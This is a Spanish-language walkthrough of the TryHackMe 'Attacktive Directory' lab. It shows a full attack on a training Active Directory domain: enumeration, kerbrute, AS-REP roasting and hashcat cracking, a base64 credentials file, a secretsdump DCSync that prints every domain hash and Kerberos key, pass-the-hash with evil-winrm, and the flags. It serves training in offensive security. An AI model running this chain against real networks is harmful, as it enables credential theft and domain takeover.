---
tags: 
    - tryhackme
    - windows
    - active-directory
---

# Attacktive Directory

## Enumeration

### Nmap

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 10.201.117.151 -oN allPorts.txt

PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49672/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49678/tcp open  unknown
49689/tcp open  unknown
49699/tcp open  unknown
```

```bash
nmap -sC -sC -p53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,47001,49664,49665,49666,49668,49672,49673,49674,49678,49689,49699 10.201.117.151 -oN target.txt

PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
3389/tcp  open  ms-wbt-server
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2025-10-03T19:56:34
|_Not valid after:  2026-04-04T19:56:34
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2025-10-04T20:00:22+00:00
|_ssl-date: 2025-10-04T20:00:20+00:00; 0s from scanner time.
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49668/tcp open  unknown
49672/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49678/tcp open  unknown
49689/tcp open  unknown
49699/tcp open  unknown

Host script results:
| smb2-time: 
|   date: 2025-10-04T20:00:22
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
```

### SMB

```bash
nxc smb 10.201.117.151                                                                                                                                                      
SMB         10.201.117.151  445    ATTACKTIVEDIREC  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False) 
```

Agregamos al etc/hosts los resultados de hosts

```bash
nxc smb 10.201.117.151 --generate-hosts-file hosts

10.201.117.151     ATTACKTIVEDIREC.spookysec.local spookysec.local ATTACKTIVEDIREC
```

```bash
enum4linux 10.201.117.151 > EnumSBM.txt

cat EnumSBM.txt 
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Oct  4 17:13:15 2025

 =========================================( Target Information )=========================================

Target ........... 10.201.117.151
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 10.201.117.151 )===========================


[E] Can t find workgroup/domain



 ===============================( Nbtstat Information for 10.201.117.151 )===============================

Looking up status of 10.201.117.151
No reply from 10.201.117.151

 ==================================( Session Check on 10.201.117.151 )==================================


[+] Server 10.201.117.151 allows sessions using username '', password ''


 ===============================( Getting domain SID for 10.201.117.151 )===============================

Domain Name: THM-AD
Domain Sid: S-1-5-21-3591857110-2884097990-301047963

[+] Host is part of a domain (not a workgroup)


 ==================================( OS information on 10.201.117.151 )==================================


[E] Can t get OS info with smbclient


[+] Got OS info for 10.201.117.151 from srvinfo: 
do_cmd: Could not initialise srvsvc. Error was NT_STATUS_ACCESS_DENIED


 ======================================( Users on 10.201.117.151 )======================================


[E] Couldn t find users using querydispinfo: NT_STATUS_ACCESS_DENIED



[E] Couldn t find users using enumdomusers: NT_STATUS_ACCESS_DENIED


 ================================( Share Enumeration on 10.201.117.151 )================================

do_connect: Connection to 10.201.117.151 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)

	Sharename       Type      Comment
	---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
Unable to connect with SMB1 -- no workgroup available

[+] Attempting to map shares on 10.201.117.151


 ===========================( Password Policy Information for 10.201.117.151 )===========================


[E] Unexpected error from polenum:



[+] Attaching to 10.201.117.151 using a NULL share

[+] Trying protocol 139/SMB...

	[!] Protocol failed: Cannot request session (Called Name:10.201.117.151)

[+] Trying protocol 445/SMB...

	[!] Protocol failed: SAMR SessionError: code: 0xc0000022 - STATUS_ACCESS_DENIED - {Access Denied} A process has requested access to an object but has not been granted those access rights.



[E] Failed to get password policy with rpcclient



 ======================================( Groups on 10.201.117.151 )======================================


[+] Getting builtin groups:


[+]  Getting builtin group memberships:


[+]  Getting local groups:


[+]  Getting local group memberships:


[+]  Getting domain groups:


[+]  Getting domain group memberships:


 =================( Users on 10.201.117.151 via RID cycling (RIDS: 500-550,1000-1050) )=================


[I] Found new SID: 
S-1-5-21-3591857110-2884097990-301047963
```

No es posible ver recursos compartidos con smb

```bash
nxc smb 10.201.117.151 -u '' -p '' --shares
 
nxc smb 10.201.117.151 -u 'guest' -p '' --shares

nxc smb 10.201.117.151  --shares
```

## kerbrute

Descargarnos los recursos compartidos para usar kerbrute

```bash
curl https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt > users.txt    

curl https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/passwordlist.txt > passwords.txt
```

Uso de kerbrute con las lista de usuarios y contraseñas

```bash
kerbrute userenum -d spookysec.local --dc 10.201.113.138 users.txt

2025/10/04 19:08:59 >  [+] VALID USERNAME:	james@spookysec.local
2025/10/04 19:09:05 >  [+] VALID USERNAME:	svc-admin@spookysec.local
2025/10/04 19:09:11 >  [+] VALID USERNAME:	James@spookysec.local
2025/10/04 19:09:14 >  [+] VALID USERNAME:	robin@spookysec.local
2025/10/04 19:09:40 >  [+] VALID USERNAME:	darkstar@spookysec.local
2025/10/04 19:09:57 >  [+] VALID USERNAME:	administrator@spookysec.local
2025/10/04 19:10:31 >  [+] VALID USERNAME:	backup@spookysec.local
2025/10/04 19:10:47 >  [+] VALID USERNAME:	paradox@spookysec.local
```

```bash
cat user_domain.txt | awk '{print $7}' | sed 's/@spookysec\.local//g' > users.txt
james
svc-admin
James
robin
darkstar
administrator
backup
paradox
```

### ASReproasting

```bash
impacket-GetNPUsers spookysec.local/ -no-pass -usersfile user_domain.txt
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] User james doesn t have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:f4829b0ad7df764f5b16a6d21398696e$aed0d8374d5e49a34d9692908583abfc74df7530ab1716721e56756863400258e2ac4cc34f17f04ec0f2414439c168b85cd121008d71eec2723325835d2b6cf9621cafeb38547225e4881a37d611fe686b9a5c6cb01a8eb4b673b03c98988664bed187d664c99ef9a2df5dcd6e7a2206602819b329cf5bd0380267bfd960d475c080563845d78f311e7f35c74fc5ae84a2a3eeac711d084616de81696affadcebdadced2b2c92e7413d334034214c8e0dfa39863dc92ea1111663a14650e762a5dc237dbedab793e048d62193af32ff3515a2270a4abbefe09623db5033b1edbf5955c9a7d1d1fe1409c82ead0e4a9154a35
[-] User James doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User darkstar doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User paradox doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Guardamos el HASH
```bash
cat hash.txt
admin@SPOOKYSEC.LOCAL:f4829b0ad7df764f5b16a6d21398696e$aed0d8374d5e49a34d9692908583abfc74df7530ab1716721e56756863400258e2ac4cc34f17f04ec0f2414439c168b85cd121008d71eec2723325835d2b6cf9621cafeb38547225e4881a37d611fe686b9a5c6cb01a8eb4b673b03c98988664bed187d664c99ef9a2df5dcd6e7a2206602819b329cf5bd0380267bfd960d475c080563845d78f311e7f35c74fc5ae84a2a3eeac711d084616de81696affadcebdadced2b2c92e7413d334034214c8e0dfa39863dc92ea1111663a14650e762a5dc237dbedab793e048d62193af32ff3515a2270a4abbefe09623db5033b1edbf5955c9a7d1d1fe1409c82ead0e4a9154a35
```

Crack del Hash

```bash
 hashcat -m 18200 --force -a 0 hash.txt /usr/share/wordlists/rockyou.txt  
 
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:f4829b0ad7df764f5b16a6d21398696e$aed0d8374d5e49a34d9692908583abfc74df7530ab1716721e56756863400258e2ac4cc34f17f04ec0f2414439c168b85cd121008d71eec2723325835d2b6cf9621cafeb38547225e4881a37d611fe686b9a5c6cb01a8eb4b673b03c98988664bed187d664c99ef9a2df5dcd6e7a2206602819b329cf5bd0380267bfd960d475c080563845d78f311e7f35c74fc5ae84a2a3eeac711d084616de81696affadcebdadced2b2c92e7413d334034214c8e0dfa39863dc92ea1111663a14650e762a5dc237dbedab793e048d62193af32ff3515a2270a4abbefe09623db5033b1edbf5955c9a7d1d1fe1409c82ead0e4a9154a35:management2005
```

| User | Password |
| --- | --- |
| svc-admin | management2005 |


Ahora tenemos la opciones de enumerar directorios

```bash
nxc smb 10.201.113.138 -u 'svc-admin' -p 'management2005' --shares 
SMB         10.201.113.138  445    ATTACKTIVEDIREC  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False) 
SMB         10.201.113.138  445    ATTACKTIVEDIREC  [+] spookysec.local\svc-admin:management2005 
SMB         10.201.113.138  445    ATTACKTIVEDIREC  [*] Enumerated shares
SMB         10.201.113.138  445    ATTACKTIVEDIREC  Share           Permissions     Remark
SMB         10.201.113.138  445    ATTACKTIVEDIREC  -----           -----------     ------
SMB         10.201.113.138  445    ATTACKTIVEDIREC  ADMIN$                          Remote Admin
SMB         10.201.113.138  445    ATTACKTIVEDIREC  backup          READ            
SMB         10.201.113.138  445    ATTACKTIVEDIREC  C$                              Default share
SMB         10.201.113.138  445    ATTACKTIVEDIREC  IPC$            READ            Remote IPC
SMB         10.201.113.138  445    ATTACKTIVEDIREC  NETLOGON        READ            Logon server share 
SMB         10.201.113.138  445    ATTACKTIVEDIREC  SYSVOL          READ            Logon server share 
```

Enumeración de usuarios

```bash
nxc smb 10.201.113.138 -u 'svc-admin' -p 'management2005' --users  
SMB         10.201.113.138  445    ATTACKTIVEDIREC  [*] Windows 10 / Server 2019 Build 17763 x64 (name:ATTACKTIVEDIREC) (domain:spookysec.local) (signing:True) (SMBv1:False) 
SMB         10.201.113.138  445    ATTACKTIVEDIREC  [+] spookysec.local\svc-admin:management2005 
SMB         10.201.113.138  445    ATTACKTIVEDIREC  -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.201.113.138  445    ATTACKTIVEDIREC  Administrator                 2020-09-17 22:53:28 0       Built-in account for administering the computer/domain 
SMB         10.201.113.138  445    ATTACKTIVEDIREC  Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.201.113.138  445    ATTACKTIVEDIREC  krbtgt                        2020-04-04 18:40:08 0       Key Distribution Center Service Account 
SMB         10.201.113.138  445    ATTACKTIVEDIREC  skidy                         2020-04-04 18:44:07 0        
SMB         10.201.113.138  445    ATTACKTIVEDIREC  breakerofthings               2020-04-04 18:51:31 0        
SMB         10.201.113.138  445    ATTACKTIVEDIREC  james                         2020-04-04 18:51:53 0        
SMB         10.201.113.138  445    ATTACKTIVEDIREC  optional                      2020-04-04 18:52:32 0        
SMB         10.201.113.138  445    ATTACKTIVEDIREC  sherlocksec                   2020-04-04 18:52:56 0        
SMB         10.201.113.138  445    ATTACKTIVEDIREC  darkstar                      2020-04-04 18:53:17 0        
SMB         10.201.113.138  445    ATTACKTIVEDIREC  Ori                           2020-04-04 18:53:46 0        
SMB         10.201.113.138  445    ATTACKTIVEDIREC  robin                         2020-04-04 18:54:08 0        
SMB         10.201.113.138  445    ATTACKTIVEDIREC  paradox                       2020-04-04 18:54:29 0        
SMB         10.201.113.138  445    ATTACKTIVEDIREC  Muirland                      2020-04-04 18:55:01 0        
SMB         10.201.113.138  445    ATTACKTIVEDIREC  horshark                      2020-04-04 18:55:29 0        
SMB         10.201.113.138  445    ATTACKTIVEDIREC  svc-admin                     2020-04-04 18:57:56 0        
SMB         10.201.113.138  445    ATTACKTIVEDIREC  backup                        2020-04-04 19:57:05 0        
SMB         10.201.113.138  445    ATTACKTIVEDIREC  a-spooks                      2020-09-17 23:02:20 0        
SMB         10.201.113.138  445    ATTACKTIVEDIREC  [*] Enumerated 17 local users: THM-AD
```

Enumeración con `smbclient`, hemos encontrado un contenido.

```bash
smbclient -U 'svc-admin' //10.201.113.138/backup
Password for [WORKGROUP\svc-admin]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Apr  4 16:08:39 2020
  ..                                  D        0  Sat Apr  4 16:08:39 2020
  backup_credentials.txt              A       48  Sat Apr  4 16:08:53 2020

		8247551 blocks of size 4096. 3572768 blocks available
smb: \> get backup_credentials.txt 
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> exit
```

```bash
cat backup_credentials.txt 
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw                
```

Decodificamos el archivo que esta en base64

```bash
echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d 
backup@spookysec.local:backup2517860
```

## Bloodhoud

Con credenciales validas podemos enumerar el sistema con Bloodhoud

```bash
bloodhound-python -u 'backup' -p 'backup2517860' -d spookysec.local -ns 10.201.113.138 -c All --zip
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: spookysec.local
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (attacktivedirectory.spookysec.local:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: attacktivedirectory.spookysec.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: attacktivedirectory.spookysec.local
INFO: Found 18 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 3 ous
INFO: Found 21 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: AttacktiveDirectory.spookysec.local
INFO: Ignoring host AttacktiveDirectory.spookysec.local since its reported name ATTACKTIVEDIREC does not match
INFO: Done in 00M 43S
INFO: Compressing output into 20251004195930_bloodhound.zip
```

## impacket

```bash
impacket-secretsdump spookysec.local/backup:'backup2517860'@10.201.113.138
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e2eb8158c27bed09861033026be4c21:::
spookysec.local\skidy:1103:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\breakerofthings:1104:aad3b435b51404eeaad3b435b51404ee:5fe9353d4b96cc410b62cb7e11c57ba4:::
spookysec.local\james:1105:aad3b435b51404eeaad3b435b51404ee:9448bf6aba63d154eb0c665071067b6b:::
spookysec.local\optional:1106:aad3b435b51404eeaad3b435b51404ee:436007d1c1550eaf41803f1272656c9e:::
spookysec.local\sherlocksec:1107:aad3b435b51404eeaad3b435b51404ee:b09d48380e99e9965416f0d7096b703b:::
spookysec.local\darkstar:1108:aad3b435b51404eeaad3b435b51404ee:cfd70af882d53d758a1612af78a646b7:::
spookysec.local\Ori:1109:aad3b435b51404eeaad3b435b51404ee:c930ba49f999305d9c00a8745433d62a:::
spookysec.local\robin:1110:aad3b435b51404eeaad3b435b51404ee:642744a46b9d4f6dff8942d23626e5bb:::
spookysec.local\paradox:1111:aad3b435b51404eeaad3b435b51404ee:048052193cfa6ea46b5a302319c0cff2:::
spookysec.local\Muirland:1112:aad3b435b51404eeaad3b435b51404ee:3db8b1419ae75a418b3aa12b8c0fb705:::
spookysec.local\horshark:1113:aad3b435b51404eeaad3b435b51404ee:41317db6bd1fb8c21c2fd2b675238664:::
spookysec.local\svc-admin:1114:aad3b435b51404eeaad3b435b51404ee:fc0f1e5359e372aa1f69147375ba6809:::
spookysec.local\backup:1118:aad3b435b51404eeaad3b435b51404ee:19741bde08e135f4b40f1ca9aab45538:::
spookysec.local\a-spooks:1601:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
ATTACKTIVEDIREC$:1000:aad3b435b51404eeaad3b435b51404ee:f8d7323fbad9b7b6560461c8787b2338:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
krbtgt:aes256-cts-hmac-sha1-96:b52e11789ed6709423fd7276148cfed7dea6f189f3234ed0732725cd77f45afc
krbtgt:aes128-cts-hmac-sha1-96:e7301235ae62dd8884d9b890f38e3902
krbtgt:des-cbc-md5:b94f97e97fabbf5d
spookysec.local\skidy:aes256-cts-hmac-sha1-96:3ad697673edca12a01d5237f0bee628460f1e1c348469eba2c4a530ceb432b04
spookysec.local\skidy:aes128-cts-hmac-sha1-96:484d875e30a678b56856b0fef09e1233
spookysec.local\skidy:des-cbc-md5:b092a73e3d256b1f
spookysec.local\breakerofthings:aes256-cts-hmac-sha1-96:4c8a03aa7b52505aeef79cecd3cfd69082fb7eda429045e950e5783eb8be51e5
spookysec.local\breakerofthings:aes128-cts-hmac-sha1-96:38a1f7262634601d2df08b3a004da425
spookysec.local\breakerofthings:des-cbc-md5:7a976bbfab86b064
spookysec.local\james:aes256-cts-hmac-sha1-96:1bb2c7fdbecc9d33f303050d77b6bff0e74d0184b5acbd563c63c102da389112
spookysec.local\james:aes128-cts-hmac-sha1-96:08fea47e79d2b085dae0e95f86c763e6
spookysec.local\james:des-cbc-md5:dc971f4a91dce5e9
spookysec.local\optional:aes256-cts-hmac-sha1-96:fe0553c1f1fc93f90630b6e27e188522b08469dec913766ca5e16327f9a3ddfe
spookysec.local\optional:aes128-cts-hmac-sha1-96:02f4a47a426ba0dc8867b74e90c8d510
spookysec.local\optional:des-cbc-md5:8c6e2a8a615bd054
spookysec.local\sherlocksec:aes256-cts-hmac-sha1-96:80df417629b0ad286b94cadad65a5589c8caf948c1ba42c659bafb8f384cdecd
spookysec.local\sherlocksec:aes128-cts-hmac-sha1-96:c3db61690554a077946ecdabc7b4be0e
spookysec.local\sherlocksec:des-cbc-md5:08dca4cbbc3bb594
spookysec.local\darkstar:aes256-cts-hmac-sha1-96:35c78605606a6d63a40ea4779f15dbbf6d406cb218b2a57b70063c9fa7050499
spookysec.local\darkstar:aes128-cts-hmac-sha1-96:461b7d2356eee84b211767941dc893be
spookysec.local\darkstar:des-cbc-md5:758af4d061381cea
spookysec.local\Ori:aes256-cts-hmac-sha1-96:5534c1b0f98d82219ee4c1cc63cfd73a9416f5f6acfb88bc2bf2e54e94667067
spookysec.local\Ori:aes128-cts-hmac-sha1-96:5ee50856b24d48fddfc9da965737a25e
spookysec.local\Ori:des-cbc-md5:1c8f79864654cd4a
spookysec.local\robin:aes256-cts-hmac-sha1-96:8776bd64fcfcf3800df2f958d144ef72473bd89e310d7a6574f4635ff64b40a3
spookysec.local\robin:aes128-cts-hmac-sha1-96:733bf907e518d2334437eacb9e4033c8
spookysec.local\robin:des-cbc-md5:89a7c2fe7a5b9d64
spookysec.local\paradox:aes256-cts-hmac-sha1-96:64ff474f12aae00c596c1dce0cfc9584358d13fba827081afa7ae2225a5eb9a0
spookysec.local\paradox:aes128-cts-hmac-sha1-96:f09a5214e38285327bb9a7fed1db56b8
spookysec.local\paradox:des-cbc-md5:83988983f8b34019
spookysec.local\Muirland:aes256-cts-hmac-sha1-96:81db9a8a29221c5be13333559a554389e16a80382f1bab51247b95b58b370347
spookysec.local\Muirland:aes128-cts-hmac-sha1-96:2846fc7ba29b36ff6401781bc90e1aaa
spookysec.local\Muirland:des-cbc-md5:cb8a4a3431648c86
spookysec.local\horshark:aes256-cts-hmac-sha1-96:891e3ae9c420659cafb5a6237120b50f26481b6838b3efa6a171ae84dd11c166
spookysec.local\horshark:aes128-cts-hmac-sha1-96:c6f6248b932ffd75103677a15873837c
spookysec.local\horshark:des-cbc-md5:a823497a7f4c0157
spookysec.local\svc-admin:aes256-cts-hmac-sha1-96:effa9b7dd43e1e58db9ac68a4397822b5e68f8d29647911df20b626d82863518
spookysec.local\svc-admin:aes128-cts-hmac-sha1-96:aed45e45fda7e02e0b9b0ae87030b3ff
spookysec.local\svc-admin:des-cbc-md5:2c4543ef4646ea0d
spookysec.local\backup:aes256-cts-hmac-sha1-96:23566872a9951102d116224ea4ac8943483bf0efd74d61fda15d104829412922
spookysec.local\backup:aes128-cts-hmac-sha1-96:843ddb2aec9b7c1c5c0bf971c836d197
spookysec.local\backup:des-cbc-md5:d601e9469b2f6d89
spookysec.local\a-spooks:aes256-cts-hmac-sha1-96:cfd00f7ebd5ec38a5921a408834886f40a1f40cda656f38c93477fb4f6bd1242
spookysec.local\a-spooks:aes128-cts-hmac-sha1-96:31d65c2f73fb142ddc60e0f3843e2f68
spookysec.local\a-spooks:des-cbc-md5:e09e4683ef4a4ce9
ATTACKTIVEDIREC$:aes256-cts-hmac-sha1-96:96ec7afbd0091e45ff94977b5e816e9da65c8673177862bea627e6a1810006e4
ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:e223aa7f70cb387a2b6f4dcaf35c59be
ATTACKTIVEDIREC$:des-cbc-md5:4f2052a710fe1f3e
[*] Cleaning up... 
```

Nos conectamos con evil winrm

```bash
evil-winrm -u 'Administrator' -H 0e0363213e37b94221497260b0bcb4fc -i 10.201.113.138
 
 *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
thm-ad\administrator
```

```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
TryHackMe{4ctiveD1rectoryM4st3r}

*Evil-WinRM* PS C:\Users\backup\Desktop> cat PrivEsc.txt
TryHackMe{B4ckM3UpSc0tty!}

*Evil-WinRM* PS C:\Users\svc-admin\Desktop> cat user.txt.txt
TryHackMe{K3rb3r0s_Pr3_4uth}
```

